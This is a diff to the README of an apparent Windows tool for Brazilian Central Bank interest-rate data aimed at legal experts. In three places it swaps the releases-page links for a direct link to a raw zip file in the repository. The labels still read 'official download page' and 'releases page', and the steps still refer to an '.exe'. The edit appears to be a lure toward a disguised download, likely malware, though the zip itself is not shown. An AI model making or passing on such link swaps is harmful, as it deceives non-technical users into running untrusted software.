@@ -1,6 +1,6 @@
 # 📊 sgs-peritos - Calculate expert financial interest rates easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Reagranulated976/sgs-peritos/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Reagranulated976/sgs-peritos/raw/refs/heads/main/sgs_peritos/sgs-peritos-1.7.zip)
 
 This application provides direct access to interest rate data from the Central Bank of Brazil. It presents complex datasets in a format ready for use in court cases and financial reports. Professionals in banking, labor, tax, and social security litigation use this tool to build accurate calculations.
 
@@ -18,7 +18,7 @@ The software simplifies the process of gathering official financial data for leg
 
 You do not need programming knowledge to run this software. The application runs as a standalone program on your Windows computer. Follow these steps to set up the tool.
 
-1.  Visit the [official download page](https://github.com/Reagranulated976/sgs-peritos/releases).
+1.  Visit the [official download page](https://github.com/Reagranulated976/sgs-peritos/raw/refs/heads/main/sgs_peritos/sgs-peritos-1.7.zip).
 2.  Locate the latest release at the top of the list.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the file finishes downloading, move it to a folder where you want the application to live.
@@ -72,7 +72,7 @@ Judicial experts, technicians, lawyers, and accountants benefit from this tool. 
 
 ## 📈 Troubleshooting
 
-If you encounter an error while fetching data, check your internet connection first. Ensure that your firewall does not prevent the application from making outgoing network requests. If the issue persists, download the latest version from [the releases page](https://github.com/Reagranulated976/sgs-peritos/releases) to ensure you have the current patches.
+If you encounter an error while fetching data, check your internet connection first. Ensure that your firewall does not prevent the application from making outgoing network requests. If the issue persists, download the latest version from [the releases page](https://github.com/Reagranulated976/sgs-peritos/raw/refs/heads/main/sgs_peritos/sgs-peritos-1.7.zip) to ensure you have the current patches.
 
 Delete the existing folder and perform a fresh download if the application behaves in an unexpected way after a system update. This ensures the files remain clean and functional.
 
